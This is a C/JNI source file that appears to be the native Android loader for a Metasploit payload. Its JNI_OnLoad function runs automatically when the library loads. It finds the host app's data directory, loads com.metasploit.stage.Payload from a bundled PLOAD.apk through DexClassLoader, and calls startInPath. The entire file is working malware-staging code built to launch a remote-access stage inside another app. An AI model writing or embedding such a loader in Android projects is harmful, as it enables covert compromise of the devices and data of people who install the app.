#include <stdio.h>
#include <string.h>
#include <jni.h>
#include <fcntl.h>
#include <android/log.h>

#define MAX_PATH 260

JNIEXPORT jint JNICALL JNI_OnLoad( JavaVM *vm, void *pvt )
{
    JNIEnv *env;

    if((*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4) != JNI_OK)
    {
        return -1;
    }

    char cmdline[MAX_PATH];
    char stage_file[MAX_PATH];
    char file_dir[MAX_PATH];
    snprintf(cmdline, MAX_PATH, "/proc/%d/cmdline", getpid());
    int r = 0;
    int fd = open(cmdline, O_RDONLY);
    if(fd == 0) {
        r = 0;
    } else {
        r = read(fd, cmdline, MAX_PATH-1);
        close(fd);
        if(r < 0) r = 0;
    }
    cmdline[r] = 0;
    snprintf(stage_file, MAX_PATH, "/data/data/%s/PLOAD.apk", cmdline);
    snprintf(file_dir, MAX_PATH, "/data/data/%s/", cmdline);

    jstring file_path = (*env)->NewStringUTF(env, file_dir);
    jstring jar_file = (*env)->NewStringUTF(env, stage_file);
    jstring class_file = (*env)->NewStringUTF(env, "com.metasploit.stage.Payload");
    jclass dex_class = (*env)->FindClass(env, "dalvik/system/DexClassLoader");
    jclass class_class = (*env)->FindClass(env, "java/lang/Class");
    jobject class_loader = (*env)->CallObjectMethod(env, class_class, (*env)->GetMethodID(env, class_class, "getClassLoader", "()Ljava/lang/ClassLoader;"));

    // Load the payload apk
    jobject dex_loader = (*env)->NewObject(env, dex_class, (*env)->GetMethodID(env, dex_class, "<init>", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V"),
            jar_file, file_path, file_path, class_loader);
    jclass payload_class = (*env)->CallObjectMethod(env, dex_loader,
            (*env)->GetMethodID(env, dex_class, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;"),
            class_file);

    // Call Payload.startInPath();
    (*env)->CallStaticVoidMethod(env, payload_class, (*env)->GetStaticMethodID(env, payload_class, "startInPath", "(Ljava/lang/String;)V"), file_path);

    (*env)->DeleteLocalRef(env, jar_file);
    (*env)->DeleteLocalRef(env, file_path);
    (*env)->DeleteLocalRef(env, class_file);
    (*env)->DeleteLocalRef(env, dex_class);
    (*env)->DeleteLocalRef(env, class_class);
    (*env)->DeleteLocalRef(env, payload_class);

    return JNI_VERSION_1_4;
}

JNIEXPORT void JNICALL JNI_OnUnload( JavaVM *vm, void *pvt )
{
}

